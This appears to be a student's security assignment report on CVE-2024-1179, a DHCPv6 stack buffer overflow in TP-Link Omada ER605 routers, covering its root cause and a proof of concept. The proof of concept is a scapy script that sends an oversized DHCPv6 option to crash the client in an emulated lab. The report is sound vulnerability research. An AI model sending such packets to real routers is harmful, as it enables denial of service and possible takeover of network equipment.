# QuarksLab Assignment
CVE-2024-1179 Report

# Summary:
CVE-2024-1179 (Stack-based Buffer Overflow) allows attackers to execute arbitrary code on affected installations of TP-Link Omada ER605 routers. Authentication is not required to exploit this vulnerability.The specific flaw exists within the handling of DHCP options.

# Common Vulnerability Scoring System:
- CVSS Rating: High
- CVSS Score: 7.5
- CVSS Vector: CVSS:3.0/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

# Affected Products:
TP-Link Omada ER605 | DHCPv6

# Root Cause:
The vulnerability in the DHCPv6 client stems from insufficient validation of incoming data length before using memcpy to copy it into a fixed-size buffer. Specifically, when handling aftr_name, the code fails to ensure that the length (tlen) does not exceed the buffer size.
1. **Insufficient Size Checks:** The code does not properly validate whether the length of the data to be copied (tlen) fits within the allocated buffer space. This can lead to a buffer overflow if tlen is larger than the buffer.
2. **Data Manipulation Risks:** The way tlen is derived and manipulated can allow an attacker to control the size of the data being copied, potentially leading to unpredictable behavior and memory corruption.

**Vulnerable Code:**
![Alt text](https://raw.githubusercontent.com/MohamedNourTN/QuarksLabTest/refs/heads/main/vulncode.png)


# PoC:
1- **Simulate and build a network**

2- **Change <0 to >=0**
From: 
if ( setsockopt(sock, 0xFFFF, 512, &v41, 4) < 0 )
To:
if ( setsockopt(sock, 0xFFFF, 512, &v41, 4) >= 0 )

3- **Crashing memcpy by sending DHCPv6 Reply Message**
```python
import socket
from pwn import *
import binascii
from threading import Thread
from scapy.all import *
from scapy.layers.inet6 import IPv6, UDP
from scapy.layers.dhcp6 import DHCP6_Reply, DHCP6OptServerId, DHCP6OptClientId

context(os='linux', arch='mips', log_level='debug')

li = lambda x: print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x: print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')
lg = lambda x: print('\033[32m' + str(x) + '\033[0m')

ip = '192.168.10.200'
port = 546

def send_dhcp6_reply_and_listen(interface, src_ipv6, dst_ipv6, src_mac, dst_mac, transaction_id):
    #Construct the Ethernet layer
    ether_layer = Ether(src=src_mac, dst=dst_mac)
    li(ether_layer)

    #Construct the IPv6 layer
    ipv6_layer = IPv6(src=src_ipv6, dst=dst_ipv6)
    li(ipv6_layer)

    #Construct the UDP layer
    udp_layer = UDP(sport=547, dport=546)  #Note the port number, the server is 547, the client is 546
    li(udp_layer)

    #Construct the DHCPv6 REPLY message
    dhcp6_reply = DHCP6_Reply(trid=transaction_id)
    li(dhcp6_reply)

    #Construct the Server ID option
    server_id = DHCP6OptServerId(duid=DUID_LLT(hwtype=1, lladdr=src_mac))
    li(server_id)

    #Construct the Client ID option
    client_id = DHCP6OptClientId(duid=DUID_LLT(hwtype=1, lladdr=dst_mac))
    li(client_id)

    p1 = b'\x00\x40\x03\x00'
    p2 = (b'\xff' + b'a' * 0xff) * 3
    li(hex(len(p2)))
    p1 += p2

    #Combine all layers
    packet = ether_layer / ipv6_layer / udp_layer / dhcp6_reply / p1
    li(bytes(packet))

    #Send data packet
    sendp(packet)
    print("DHCPv6 Reply message has been sent, waiting for response...")

    #Set up a snoop filter to capture DHCPv6 Solicit or Request messages as responses
    def filter_reply(pkt):
        return DHCP6_Reply in pkt and pkt[DHCP6_Reply].trid == transaction_id

    #Listen for responses on the network for 5 seconds
    response = sniff(iface=interface, filter="udp and port 546", prn=lambda x: x.show(), 
                     lfilter=filter_reply, timeout=5, count=1)

    #Determine whether a response is received
    if response:
        print("Successfully received DHCPv6 response.")
    else:
        print("No DHCPv6 response received.")

interface_name = "br0"  #Network interface name in Linux 
source_ipv6 = "fe80::21c:42ff:fee0:61cf"  #Source IPv6 address
destination_ipv6 = "fe80::216:3eff:fe00:1"  #Destination IPv6 address (the dhcp6c client IPv6 address in the virtual machine)
source_mac = "00:0c:29:b2:c1:98"  #Source MAC address
destination_mac = "00:16:3E:00:00:01"  #Destination MAC address (MAC address of the network interface in the virtual machine)
transaction_id = 0x25d6bd  #Transaction ID
getAftrName = "a"

#Send DHCPv6 ADVERTISE message
send_dhcp6_reply_and_listen(interface_name, source_ipv6, destination_ipv6, source_mac, destination_mac, transaction_id)
